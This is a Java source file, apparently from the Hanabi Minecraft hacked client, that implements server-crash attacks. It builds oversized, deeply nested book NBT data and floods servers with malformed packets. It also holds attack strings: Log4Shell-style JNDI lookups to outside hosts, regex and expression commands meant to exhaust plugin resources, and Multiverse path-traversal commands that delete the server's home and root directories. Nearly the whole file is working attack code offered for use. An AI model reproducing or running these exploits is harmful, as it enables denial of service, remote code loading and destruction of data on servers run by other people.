package cn.hanabi.utils.crasher;

import cn.hanabi.Hanabi;
import io.netty.buffer.Unpooled;
import java.util.Random;
import java.util.concurrent.ThreadLocalRandom;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C03PacketPlayer;
import net.minecraft.network.play.client.C08PacketPlayerBlockPlacement;
import net.minecraft.network.play.client.C0EPacketClickWindow;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import net.minecraft.util.BlockPos;
import org.apache.commons.lang3.RandomStringUtils;

public class CrashUtils {
   public String[] unicode = new String[]{"م", "⾟", "✈", "龜", "樓", "ᳱ", "ᳩ", "ᳫ", "ᳬ", "᳭", "ᳮ", "ᳯ", "ᳰ", "⿓", "⿕", "⿔", "\ud803\ude60", "\ud803\ude65", "ᮚ", "ꩶ", "꩷", "㉄", "Ὦ", "Ἇ", "ꬱ", "ꭑ", "ꭐ", "ꭧ", "ɸ", "Ａ", "\u007f"};
   public String lpx = "...................................................Ѳ2.6602355499702653E8";
   public String netty = ".................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................";
   String[] buffertype = new String[]{"MC|BSign", "MC|BEdit"};
   public String pexcrashexp1 = "/pex promote a a";
   public String pexcrashexp2 = "/pex promote b b";
   public String mv = "/Mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^";
   public String fawe = "/to for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}";
   public String pdw = "{\"petya.exe\":\"${jndi:rmi://du.pa}\"}}";
   public String pdw2 = "{\"petya.exe\":\"${jndi:rmi://google.com/a}${jndi:rmi://google.com/a}${jndi:rmi://google.com/a}${jndi:rmi://google.com/a}${jndi:rmi://google.com/a}${jndi:rmi://google.com/a}${jndi:rmi://google.com/a}${jndi:rmi://google.com/a}${jndi:rmi://google.com/a}${jndi:rmi://google.com/a}\"}}";
   public String[] oldmv = new String[]{"/mv import ../../../../../home normal -t flat", "/mv import ../../../../../root normal -t flat", "/mv delete ../../../../../home", "/mv confirm", "/mv delete ../../../../../root", "/mv confirm"};

   public String AlphabeticRandom(int count) {
      return RandomStringUtils.randomAlphabetic(count);
   }

   public String NumberRandom(int count) {
      return RandomStringUtils.randomNumeric(count);
   }

   public String AsciirRandom(int count) {
      return RandomStringUtils.randomAscii(count);
   }

   public void oneblockcrash(ItemStack stack) {
      Hanabi.INSTANCE.packetQueue.add(new C08PacketPlayerBlockPlacement(new BlockPos(Minecraft.getMinecraft().thePlayer.posX, Minecraft.getMinecraft().thePlayer.posY - (double)(new Random()).nextFloat() - 1.0, Minecraft.getMinecraft().thePlayer.posZ), (new Random()).nextInt(255), stack, 0.0F, 0.0F, 0.0F));
   }

   public void payload1(ItemStack stack) {
      PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
      packetBuffer.writeItemStackToBuffer(stack);
      Hanabi.INSTANCE.packetQueue.add(new C17PacketCustomPayload("MC|BEdit", packetBuffer));
   }

   public void payload2(ItemStack stack) {
      PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
      packetBuffer.writeItemStackToBuffer(stack);
      Hanabi.INSTANCE.packetQueue.add(new C17PacketCustomPayload(this.buffertype[ThreadLocalRandom.current().nextInt(1)], packetBuffer));
   }

   public void creatandpayload(ItemStack stack) {
      PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
      packetBuffer.writeItemStackToBuffer(stack);
      Hanabi.INSTANCE.packetQueue.add(new C10PacketCreativeInventoryAction(0, stack));
      Hanabi.INSTANCE.packetQueue.add(new C17PacketCustomPayload("MC|BEdit", packetBuffer));
   }

   public void creatandplace(ItemStack stack) {
      Hanabi.INSTANCE.packetQueue.add(new C10PacketCreativeInventoryAction(0, stack));
      Hanabi.INSTANCE.packetQueue.add(new C08PacketPlayerBlockPlacement(new BlockPos(Minecraft.getMinecraft().thePlayer.posX, Minecraft.getMinecraft().thePlayer.posY - (double)(new Random()).nextFloat() - 1.0, Minecraft.getMinecraft().thePlayer.posZ), (new Random()).nextInt(255), stack, 0.0F, 0.0F, 0.0F));
   }

   public void click(ItemStack stack) {
      Hanabi.INSTANCE.packetQueue.add(new C0EPacketClickWindow(0, Integer.MIN_VALUE, 0, 0, stack, (short)0));
   }

   public void creatandclick(ItemStack stack) {
      Hanabi.INSTANCE.packetQueue.add(new C10PacketCreativeInventoryAction(Integer.MIN_VALUE, stack));
      Hanabi.INSTANCE.packetQueue.add(new C0EPacketClickWindow(0, Integer.MIN_VALUE, 0, 3, stack, (short)0));
   }

   public void justcreate(ItemStack stack) {
      Hanabi.INSTANCE.packetQueue.add(new C10PacketCreativeInventoryAction(-999, stack));
   }

   public void custombyte(int amount) {
      double x = Minecraft.getMinecraft().thePlayer.posX;
      double y = Minecraft.getMinecraft().thePlayer.posY;
      double z = Minecraft.getMinecraft().thePlayer.posZ;

      for(int j = 0; j < amount; ++j) {
         double i = ThreadLocalRandom.current().nextDouble(0.4, 1.2);
         if (y > 255.0) {
            y = 255.0;
         }

         Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(x, y, z, false));
         Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(x, y, z, true));
      }

   }

   public void crashdemo(String sign, int booktype, int bookvalue, int redo, boolean customedit, CrashType type, int amount) {
      NBTTagCompound compound = new NBTTagCompound();
      NBTTagList tagList = new NBTTagList();
      StringBuilder builder = new StringBuilder();
      Item hold;
      switch (booktype) {
         case 0:
            hold = Items.writable_book;
            break;
         case 1:
            hold = Items.book;
            break;
         case 2:
         default:
            hold = Items.written_book;
      }

      int size;
      if (customedit) {
         builder.append(sign);
      } else {
         builder.append("{");

         for(size = 0; size < bookvalue; ++size) {
            builder.append("extra:[{");
         }

         for(size = 0; size < bookvalue; ++size) {
            builder.append("text:").append(sign).append("}],");
         }

         builder.append("text:").append(sign).append("}");
      }

      for(size = 0; size < redo; ++size) {
         tagList.appendTag(new NBTTagString(builder.toString()));
      }

      compound.setString("author", Minecraft.getMinecraft().getSession().getUsername());
      compound.setString("title", "Hanabi" + this.AlphabeticRandom(5));
      compound.setByte("resolved", (byte)1);
      compound.setTag("pages", tagList);
      ItemStack stack = new ItemStack(hold);
      stack.setTagCompound(compound);
      int packet = 0;

      while(packet++ < amount) {
         switch (type) {
            case PLACE:
               this.oneblockcrash(stack);
               break;
            case CLICK:
               this.click(stack);
               break;
            case PAYLOAD1:
               this.payload1(stack);
               break;
            case PAYLOAD2:
               this.payload2(stack);
               break;
            case CAP:
               this.creatandplace(stack);
               break;
            case CAC:
               this.creatandclick(stack);
               break;
            case CAPL:
               this.creatandpayload(stack);
               break;
            case CREATE:
               this.justcreate(stack);
         }
      }

   }

   public static enum CrashType {
      PLACE,
      CLICK,
      PAYLOAD1,
      PAYLOAD2,
      CAP,
      CAC,
      CAPL,
      CREATE;
   }
}
